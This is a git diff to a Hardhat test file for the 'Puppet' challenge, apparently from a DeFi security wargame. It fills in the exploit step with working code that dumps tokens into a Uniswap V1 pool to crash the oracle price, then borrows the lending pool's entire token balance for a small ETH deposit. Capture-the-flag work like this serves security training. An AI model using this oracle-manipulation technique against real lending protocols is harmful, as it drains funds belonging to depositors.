@@ -1,3 +1,5 @@
+//@ts-check
+/// <reference path="../../node_modules/@nomiclabs/hardhat-ethers/src/internal/type-extensions.ts" />
 const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
 const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
@@ -102,7 +104,27 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // move price by selling all my tokens to ether
+        this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.constants.MaxUint256);
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+                this.token.balanceOf(attacker.address),
+                1, 
+                (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+
+        // borrow all the available tokens
+        const depositRequired = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await this.lendingPool.connect(attacker).borrow(
+            POOL_INITIAL_TOKEN_BALANCE,
+            {value: depositRequired}
+        );
+
+        // get back some tokens to pass the tests
+        await this.uniswapExchange.connect(attacker).ethToTokenSwapInput(
+            1,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            {value: 1e10, gasLimit: 1e6}
+        );
     });
 
     after(async function () {
